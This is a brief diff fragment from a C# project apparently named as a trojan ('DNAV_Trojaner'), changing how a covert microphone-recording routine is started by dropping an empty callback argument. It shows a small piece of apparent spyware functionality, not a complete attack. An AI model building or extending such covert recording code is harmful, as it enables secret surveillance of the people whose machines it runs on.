@@ -399,8 +399,7 @@ namespace DNAV_Trojaner
             if (this.RecordMicrophone)
             {
                 Audio aufnahme = new Audio(this.RecordMicrophonePath);
-                Audio.Execution func = (path) => {};
-                aufnahme.Start(this.RecordMicrophoneLength, func);
+                aufnahme.Start(this.RecordMicrophoneLength);
             }
         }
     }
